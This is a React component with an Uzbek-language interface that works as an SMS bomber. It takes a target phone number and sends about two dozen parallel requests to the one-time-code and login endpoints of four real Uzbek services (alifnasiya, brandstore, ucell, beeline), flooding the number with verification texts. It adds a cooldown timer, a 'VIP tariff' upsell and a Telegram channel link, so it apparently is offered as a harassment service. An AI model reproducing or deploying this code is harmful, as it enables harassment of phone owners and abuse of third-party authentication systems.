import React, { useState, useEffect } from "react";
import { Send, AlertCircle, CheckCircle2, Timer, XCircle } from "lucide-react";
import { useNavigate } from 'react-router-dom';
import "../styles/App.css";

// Helper function to handle API requests with timeout
const sendRequest = async (url, body, method = "POST", headers = {}) => {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 10000);

  try {
    const response = await fetch(url, {
      method,
      headers: {
        "Content-Type": "application/json",
        ...headers,
      },
      body: JSON.stringify(body),
      signal: controller.signal,
    });

    clearTimeout(timeoutId);

    if (!response.ok) {
      throw new Error(`Error with request to ${url}`);
    }

    return { success: true, url };
  } catch (error) {
    clearTimeout(timeoutId);
    return { success: false, url, error: error.message };
  }
};

function SMSSender() {
  const [phone, setPhone] = useState("");
  const [loading, setLoading] = useState(false);
  const [successCount, setSuccessCount] = useState(0);
  const [failCount, setFailCount] = useState(0);
  const [showStats, setShowStats] = useState(false);
  const [cooldown, setCooldown] = useState(0);

  const lastSentTime = localStorage.getItem('lastSentTime');
  const [lastSent, setLastSent] = useState(lastSentTime ? new Date(lastSentTime) : null);

  useEffect(() => {
    let interval;
    if (cooldown > 0) {
      interval = setInterval(() => {
        setCooldown((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [cooldown]);

  const sendSMS = async () => {
    if (phone.length !== 12) {
      alert("Iltimos, 12 raqamli telefon raqamini kiriting");
      return;
    }

    setLoading(true);
    setShowStats(true);
    setSuccessCount(0);
    setFailCount(0);

    const apis = [
      {
        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
        body: { phone },
      },
      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },
      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
        body: { phone },
      },
      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },
  
  
      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
  
      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
        body: { phone },
      },
      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },
  
  
      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
        body: { phone },
      },
      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },
  
      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
        body: { phone },
      },
      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },
  
      {
        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
        body: { phone: `+${phone}` },
      },
      {
        url: "https://market.beeline.uz/api/web/auth/login",
        body: { phone: `+${phone}` },
      },
      
      {
        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
        body: { phone },
      },
      {
        url: "https://api.brandstore.uz/api/auth/code/create",
        body: { phone },
      },
    ];

    const results = await Promise.all(
      apis.map((api) => sendRequest(api.url, api.body))
    );

    const successResults = results.filter((r) => r.success);
    const failResults = results.filter((r) => !r.success);

    setSuccessCount(successResults.length);
    setFailCount(failResults.length);
    setLastSent(new Date());
    localStorage.setItem('lastSentTime', new Date().toISOString());
    setCooldown(50); // 50 second cooldown
    setLoading(false);
  };

  const formatTime = (date) => {
    return new Intl.DateTimeFormat("uz", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    }).format(date);
  };

  const navigate = useNavigate(); // Sahifaga o'tish uchun hook

  const goToVipPage = () => {
    navigate('/Vip-Page'); // "/Vip" sahifasiga o'tish
  };

  const handleAdminClick = () => {
    window.location.href = "https://t.me/tohirjonov_channel";
  };

  useEffect(() => {
    if (lastSent) {
      const diff = Math.floor((new Date() - lastSent) / 1000); // Difference in seconds
      if (diff < 50) {
        setCooldown(50 - diff); // Set the remaining time for cooldown
      }
    }
  }, [lastSent]);

  return (
    <div className="container">
      <div className="card sms-card">
        <h1 className="title">🚀SMS Yuborish</h1>

        <div className="input-group">
          <label className="input-label">Telefon raqami:</label>
          <input
            type="text"
            placeholder="998901234567"
            value={phone}
            onChange={(e) =>
              setPhone(e.target.value.replace(/\D/g, "").slice(0, 12))
            }
            className="input"
            disabled={loading || cooldown > 0}
          />
          {phone && phone.length !== 12 && (
            <span className="error-text">
              <AlertCircle size={16} />
              12 raqam bo'lishi kerak
            </span>
          )}
        </div>

        {showStats && (
          <div className="stats-container">
            <div className="stat-item success">
              <CheckCircle2 size={20} />
              <span>Yuborildi: {successCount}</span>
            </div>
            <div className="stat-item error">
              <XCircle size={20} />
              <span>Xatolik: {failCount}</span>
            </div>
            {lastSent && (
              <div className="stat-item time">
                <Timer size={20} />
                <span>Oxirgi yuborilgan vaqt: {formatTime(lastSent)}</span>
              </div>
            )}
          </div>
        )}

        <button
          onClick={sendSMS}
          disabled={loading || phone.length !== 12 || cooldown > 0}
          className="button send-button"
        >
          {loading ? (
            <div className="spinner" />
          ) : cooldown > 0 ? (
            <>
              <Timer size={24} />
              {cooldown} soniya kuting
            </>
          ) : (
            <>
              <Send size={24} />
              SMS Yuborish
            </>
          )}
        </button>
        <button className="button vip-button" onClick={goToVipPage}>
          VIP TARIFGA O'TISH💎
        </button>
        <button className="button vip-button" onClick={handleAdminClick}>Telegram kanal🌐</button>
      </div>
    </div>
  );
}

export default SMSSender;
